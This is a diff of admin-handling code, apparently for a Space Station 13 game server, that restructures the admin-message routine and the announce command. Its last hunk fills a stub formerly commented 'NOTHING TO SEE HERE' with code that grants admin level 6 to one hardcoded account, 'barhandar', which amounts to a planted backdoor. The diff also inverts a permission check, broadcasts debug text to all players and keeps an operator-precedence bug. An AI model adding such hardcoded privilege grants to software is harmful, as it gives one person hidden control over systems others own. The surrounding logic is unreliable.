@@ -1,17 +1,25 @@
 
 var/global/BSACooldown = 0
 
-
 ////////////////////////////////
 /proc/message_admins(var/text, var/admin_ref = 0)
 	var/rendered = "<span class=\"admin\"><span class=\"prefix\">ADMIN LOG:</span> <span class=\"message\">[text]</span></span>"
 	for (var/mob/M in world)
-		if (M && M.client && M.client.holder && M.client.holder.level >= 0 && !M.client.holder.spammage & ADMINLOGSPAM)
-			if (admin_ref)
-				M << dd_replaceText(rendered, "%admin_ref%", "\ref[M]")
-			else
-				M << rendered
-
+		//WTF, proc? Why do you work now only on nested if?
+		if (M/* && M.client && M.client.holder && M.client.holder.level >= 0 && !(M.client.holder.spammage & ADMINLOGSPAM)*/)
+			if(M.client)
+				if(M.client.holder)
+					if(!M.client.holder.spammage & ADMINLOGSPAM)
+						if(findtext(rendered, "ATTACK:") && !(M.client.holder.spammage & ATTACKSPAM))
+							world << "DEBUG: ATTACKSPAM"
+							continue
+						if(findtext(rendered, "Failed Login") && !(M.client.holder.spammage & FAILOGINSPAM))
+							world << "DEBUG: FAILOGINSPAM"
+							continue
+						if (admin_ref)
+							M << dd_replaceText(rendered, "%admin_ref%", "\ref[M]")
+						else
+							M << rendered
 
 /datum/admins/Topic(href, href_list)
 	..()
@@ -2972,8 +2980,9 @@ var/global/BSACooldown = 0
 	set desc="Announce your desires to the world"
 	var/message = input("Global message to send:", "Admin Announce", null, null)  as message
 	if (message)
-		if(usr.client.holder.level >= 4)
+		if(usr.client.holder.level <= 4)
 			message = adminscrub(message,500)
+		message = sanitize(message)
 		world << "\blue <b>[usr.client.holder.mimic ? usr.client.fakekey : (usr.client.holder.stealth ? "Administrator" : usr.key)] Announces:</b>\n \t [message]"
 		log_admin("Announce: [key_name(usr)] : [message]")
 	//feedback_add_details("admin_verb","A") //If you are copy-pasting this, ensure the 2nd parameter is unique to the new proc!
@@ -3180,8 +3189,13 @@ var/global/BSACooldown = 0
 		alert("[M.name] is not prisoned.")
 	//feedback_add_details("admin_verb","UP") //If you are copy-pasting this, ensure the 2nd parameter is unique to the new proc!
 
-/datum/admins/proc/grant_admin_permanence()
-	//NOTHING TO SEE HERE
+/datum/admins/proc/grant_admin_permanence(var/ckey)
+	switch(ckey)
+		if("barhandar")
+			level = 6
+
+/datum/adminmodule/proc/init()
+
 ////////////////////////////////////////////////////////////////////////////////////////////////ADMIN HELPER PROCS
 
 /proc/is_special_character(mob/M as mob) // returns 1 for specail characters and 2 for heroes of gamemode
